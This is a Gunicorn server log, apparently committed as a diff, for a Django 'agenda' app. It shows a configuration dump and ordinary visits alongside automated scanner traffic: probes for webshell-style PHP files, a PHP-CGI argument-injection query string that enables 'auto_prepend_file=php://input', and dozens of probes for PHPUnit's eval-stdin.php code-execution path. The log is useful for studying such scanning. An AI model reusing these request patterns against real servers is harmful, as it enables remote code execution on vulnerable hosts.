+[2026-03-04 10:28:03 -0300] [47512] [DEBUG] GET /az.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /az.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47513] [DEBUG] GET /xaz.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /xaz.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47510] [DEBUG] GET /up4.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /up4.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47511] [DEBUG] GET /1aa.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /1aa.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47513] [DEBUG] GET /elp.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /elp.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47509] [DEBUG] GET /wtz.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /wtz.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47510] [DEBUG] GET /galex.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /galex.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47510] [DEBUG] GET /xb.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /xb.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47510] [DEBUG] GET /ova.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /ova.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47514] [DEBUG] GET /vx.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /vx.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:28:03 -0300] [47512] [DEBUG] GET /rh.php
+ - - [04/Mar/2026:10:28:03 -0300] "GET /rh.php HTTP/1.1" 400 143 "-" "-"
+[2026-03-04 10:37:35 -0300] [47513] [DEBUG] GET /
+ - - [04/Mar/2026:10:37:35 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
+[2026-03-04 10:37:37 -0300] [47511] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:10:37:37 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
+[2026-03-04 10:37:42 -0300] [47509] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:10:37:42 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
+[2026-03-04 10:37:44 -0300] [47513] [DEBUG] GET /security.txt
+ - - [04/Mar/2026:10:37:44 -0300] "GET /security.txt HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
+[2026-03-04 10:37:45 -0300] [47511] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:10:37:45 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
+[2026-03-04 11:20:06 -0300] [47514] [DEBUG] GET /
+ - - [04/Mar/2026:11:20:06 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
+[2026-03-04 11:28:44 -0300] [47514] [DEBUG] POST /
+ - - [04/Mar/2026:11:28:44 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 11:32:45 -0300] [47514] [DEBUG] GET /
+ - - [04/Mar/2026:11:32:45 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.49"
+[2026-03-04 11:32:46 -0300] [47514] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:11:32:46 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.49"
+[2026-03-04 11:32:52 -0300] [47510] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:11:32:52 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.49"
+[2026-03-04 11:32:56 -0300] [47510] [DEBUG] GET /security.txt
+ - - [04/Mar/2026:11:32:57 -0300] "GET /security.txt HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.49"
+[2026-03-04 11:32:58 -0300] [47510] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:11:32:58 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.49"
+[2026-03-04 12:12:28 -0300] [47510] [INFO] Worker exiting (pid: 47510)
+[2026-03-04 15:12:28 +0000] [47505] [INFO] Handling signal: term
+[2026-03-04 12:12:28 -0300] [47511] [INFO] Worker exiting (pid: 47511)
+[2026-03-04 12:12:28 -0300] [47509] [INFO] Worker exiting (pid: 47509)
+[2026-03-04 12:12:28 -0300] [47512] [INFO] Worker exiting (pid: 47512)
+[2026-03-04 12:12:28 -0300] [47514] [INFO] Worker exiting (pid: 47514)
+[2026-03-04 12:12:28 -0300] [47513] [INFO] Worker exiting (pid: 47513)
+[2026-03-04 15:12:28 +0000] [47505] [INFO] Worker (pid:47509) was sent SIGTERM!
+[2026-03-04 15:12:28 +0000] [47505] [INFO] Worker (pid:47510) was sent SIGTERM!
+[2026-03-04 15:12:28 +0000] [47505] [INFO] Worker (pid:47511) was sent SIGTERM!
+[2026-03-04 15:12:28 +0000] [47505] [INFO] Worker (pid:47514) was sent SIGTERM!
+[2026-03-04 15:12:29 +0000] [47505] [INFO] Shutting down: Master
+[2026-03-04 15:12:30 +0000] [57074] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/agenda.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/windows/agendaapp
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1001
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/windows/agendaapp/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  enable_backlog_metric: False
+  proc_name: None
+  default_proc_name: project.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x79fcded9ec40>
+  on_reload: <function OnReload.on_reload at 0x79fcded9ee50>
+  when_ready: <function WhenReady.when_ready at 0x79fcded9f060>
+  pre_fork: <function Prefork.pre_fork at 0x79fcded9f1c0>
+  post_fork: <function Postfork.post_fork at 0x79fcded9f3d0>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x79fcded9f5e0>
+  worker_int: <function WorkerInt.worker_int at 0x79fcded9f740>
+  worker_abort: <function WorkerAbort.worker_abort at 0x79fcded9f950>
+  pre_exec: <function PreExec.pre_exec at 0x79fcded9fab0>
+  pre_request: <function PreRequest.pre_request at 0x79fcded9fcc0>
+  post_request: <function PostRequest.post_request at 0x79fcded9fe20>
+  child_exit: <function ChildExit.child_exit at 0x79fcdedb4040>
+  worker_exit: <function WorkerExit.worker_exit at 0x79fcdedb41a0>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x79fcdedb4300>
+  on_exit: <function OnExit.on_exit at 0x79fcdedb4460>
+  ssl_context: <function NewSSLContext.ssl_context at 0x79fcdedb45c0>
+  proxy_protocol: off
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  protocol: http
+  uwsgi_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  http_protocols: ['h1']
+  http2_max_concurrent_streams: 100
+  http2_initial_window_size: 65535
+  http2_max_frame_size: 16384
+  http2_max_header_list_size: 65536
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+  asgi_loop: auto
+  asgi_lifespan: auto
+  asgi_disconnect_grace_period: 3
+  root_path: 
+  dirty_apps: []
+  dirty_workers: 0
+  dirty_timeout: 300
+  dirty_threads: 1
+  dirty_graceful_timeout: 30
+  on_dirty_starting: <function OnDirtyStarting.on_dirty_starting at 0x79fcdedb4a90>
+  dirty_post_fork: <function DirtyPostFork.dirty_post_fork at 0x79fcdedb4bf0>
+  dirty_worker_init: <function DirtyWorkerInit.dirty_worker_init at 0x79fcdedb4d50>
+  dirty_worker_exit: <function DirtyWorkerExit.dirty_worker_exit at 0x79fcdedb4eb0>
+  control_socket: gunicorn.ctl
+  control_socket_mode: 384
+  control_socket_disable: False
+[2026-03-04 15:12:30 +0000] [57074] [INFO] Starting gunicorn 25.1.0
+[2026-03-04 15:12:30 +0000] [57074] [DEBUG] Arbiter booted
+[2026-03-04 15:12:30 +0000] [57074] [INFO] Listening at: unix:/run/agenda.socket (57074)
+[2026-03-04 15:12:30 +0000] [57074] [INFO] Using worker: sync
+[2026-03-04 15:12:30 +0000] [57074] [INFO] Control socket listening at /home/windows/agendaapp/gunicorn.ctl
+[2026-03-04 15:12:30 +0000] [57077] [INFO] Booting worker with pid: 57077
+[2026-03-04 15:12:30 +0000] [57078] [INFO] Booting worker with pid: 57078
+[2026-03-04 15:12:30 +0000] [57079] [INFO] Booting worker with pid: 57079
+[2026-03-04 15:12:30 +0000] [57080] [INFO] Booting worker with pid: 57080
+[2026-03-04 15:12:30 +0000] [57081] [INFO] Booting worker with pid: 57081
+[2026-03-04 15:12:30 +0000] [57082] [INFO] Booting worker with pid: 57082
+[2026-03-04 15:12:30 +0000] [57074] [DEBUG] 6 workers
+[2026-03-04 12:14:00 -0300] [57082] [DEBUG] POST /
+ - - [04/Mar/2026:12:14:01 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 12:21:02 -0300] [57081] [DEBUG] GET /version
+ - - [04/Mar/2026:12:21:02 -0300] "GET /version HTTP/1.1" 404 179 "-" "-"
+[2026-03-04 12:21:02 -0300] [57081] [DEBUG] GET /
+ - - [04/Mar/2026:12:21:02 -0300] "GET / HTTP/1.1" 200 1022 "-" "-"
+[2026-03-04 12:21:03 -0300] [57079] [DEBUG] GET /
+ - - [04/Mar/2026:12:21:03 -0300] "GET / HTTP/1.1" 200 1022 "-" "-"
+[2026-03-04 12:21:03 -0300] [57078] [DEBUG] GET /v1
+ - - [04/Mar/2026:12:21:03 -0300] "GET /v1 HTTP/1.1" 404 179 "-" "-"
+[2026-03-04 12:21:04 -0300] [57082] [DEBUG] GET /
+ - - [04/Mar/2026:12:21:04 -0300] "GET / HTTP/1.1" 200 1022 "-" "-"
+[2026-03-04 12:21:09 -0300] [57079] [DEBUG] GET /
+ - - [04/Mar/2026:12:21:09 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+[2026-03-04 12:21:09 -0300] [57082] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:12:21:09 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "http://136.116.33.237:80" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+[2026-03-04 12:21:44 -0300] [57082] [DEBUG] GET /
+ - - [04/Mar/2026:12:21:44 -0300] "GET / HTTP/1.1" 200 1022 "-" "-"
+[2026-03-04 12:34:57 -0300] [57077] [DEBUG] GET /
+ - - [04/Mar/2026:12:34:57 -0300] "GET / HTTP/1.1" 200 1022 "-" "-"
+[2026-03-04 12:40:37 -0300] [57081] [DEBUG] GET /
+ - - [04/Mar/2026:12:40:37 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0"
+[2026-03-04 13:10:59 -0300] [57081] [DEBUG] GET /
+ - - [04/Mar/2026:13:10:59 -0300] "GET / HTTP/1.1" 200 1022 "-" "-"
+[2026-03-04 13:28:14 -0300] [57079] [DEBUG] POST /
+ - - [04/Mar/2026:13:28:14 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 13:28:25 -0300] [57078] [DEBUG] GET /
+ - - [04/Mar/2026:13:28:25 -0300] "GET / HTTP/1.1" 200 1022 "-" "Java/1.6.0_13"
+[2026-03-04 13:43:10 -0300] [57080] [DEBUG] GET /bins/
+ - - [04/Mar/2026:13:43:10 -0300] "GET /bins/ HTTP/1.1" 404 179 "-" "-"
+[2026-03-04 13:58:00 -0300] [57077] [DEBUG] GET /
+ - - [04/Mar/2026:13:58:00 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-04 13:58:00 -0300] [57078] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:13:58:00 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-04 13:58:04 -0300] [57080] [DEBUG] GET /wiki
+ - - [04/Mar/2026:13:58:04 -0300] "GET /wiki HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-04 15:06:24 -0300] [57080] [DEBUG] GET /
+ - - [04/Mar/2026:15:06:24 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/53.0.3056.89 Safari/537.32"
+[2026-03-04 15:38:38 -0300] [57078] [DEBUG] POST /
+ - - [04/Mar/2026:15:38:38 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 15:50:37 -0300] [57081] [DEBUG] GET /
+ - - [04/Mar/2026:15:50:37 -0300] "GET / HTTP/1.1" 200 1022 "-" "visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
+[2026-03-04 15:53:42 -0300] [57079] [DEBUG] GET /
+ - - [04/Mar/2026:15:53:42 -0300] "GET / HTTP/1.1" 200 1022 "-" "visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
+[2026-03-04 16:11:57 -0300] [57082] [DEBUG] GET /
+ - - [04/Mar/2026:16:11:57 -0300] "GET / HTTP/1.1" 200 1022 "-" "Linux Gnu (cow)"
+[2026-03-04 16:21:11 -0300] [57079] [DEBUG] GET /
+ - - [04/Mar/2026:16:21:11 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-04 16:21:11 -0300] [57080] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:16:21:11 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-04 16:21:12 -0300] [57078] [DEBUG] GET /
+ - - [04/Mar/2026:16:21:12 -0300] "GET / HTTP/1.1" 200 1022 "-" "Mozilla/5.0"
+[2026-03-04 16:21:14 -0300] [57081] [DEBUG] GET /login
+ - - [04/Mar/2026:16:21:14 -0300] "GET /login HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-04 16:22:02 -0300] [57078] [DEBUG] POST /hello.world
+ - - [04/Mar/2026:16:22:02 -0300] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:02 -0300] [57081] [DEBUG] POST /
+ - - [04/Mar/2026:16:22:02 -0300] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 403 1421 "-" "libredtail-http"
+[2026-03-04 16:22:04 -0300] [57080] [DEBUG] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:04 -0300] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:04 -0300] [57082] [DEBUG] GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:04 -0300] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:05 -0300] [57080] [DEBUG] GET /vendor/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:05 -0300] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:06 -0300] [57079] [DEBUG] GET /vendor/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:06 -0300] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:06 -0300] [57079] [DEBUG] GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
+ - - [04/Mar/2026:16:22:06 -0300] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:06 -0300] [57078] [DEBUG] GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:06 -0300] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:07 -0300] [57082] [DEBUG] GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:07 -0300] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:07 -0300] [57080] [DEBUG] GET /phpunit/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:07 -0300] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:08 -0300] [57079] [DEBUG] GET /phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:08 -0300] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:12 -0300] [57078] [DEBUG] GET /phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:12 -0300] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:12 -0300] [57077] [DEBUG] GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:12 -0300] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:12 -0300] [57081] [DEBUG] GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:12 -0300] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:13 -0300] [57081] [DEBUG] GET /lib/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:13 -0300] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:17 -0300] [57081] [DEBUG] GET /lib/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:17 -0300] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:17 -0300] [57079] [DEBUG] GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:17 -0300] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:18 -0300] [57078] [DEBUG] GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:18 -0300] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:18 -0300] [57078] [DEBUG] GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:18 -0300] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:19 -0300] [57077] [DEBUG] GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:19 -0300] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:19 -0300] [57079] [DEBUG] GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:19 -0300] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:19 -0300] [57078] [DEBUG] GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:19 -0300] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:19 -0300] [57077] [DEBUG] GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:19 -0300] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:20 -0300] [57081] [DEBUG] GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:20 -0300] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:20 -0300] [57082] [DEBUG] GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:20 -0300] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:21 -0300] [57077] [DEBUG] GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:21 -0300] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:21 -0300] [57078] [DEBUG] GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:21 -0300] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:22 -0300] [57081] [DEBUG] GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:22 -0300] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:23 -0300] [57077] [DEBUG] GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:23 -0300] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:23 -0300] [57080] [DEBUG] GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:23 -0300] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:24 -0300] [57077] [DEBUG] GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:24 -0300] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:24 -0300] [57078] [DEBUG] GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:24 -0300] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 0 "-" "libredtail-http"
+[2026-03-04 16:22:25 -0300] [57078] [DEBUG] GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:25 -0300] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:25 -0300] [57082] [DEBUG] GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:25 -0300] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:26 -0300] [57079] [DEBUG] GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:26 -0300] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:26 -0300] [57078] [DEBUG] GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:26 -0300] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:27 -0300] [57082] [DEBUG] GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:16:22:27 -0300] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 16:22:27 -0300] [57082] [DEBUG] GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
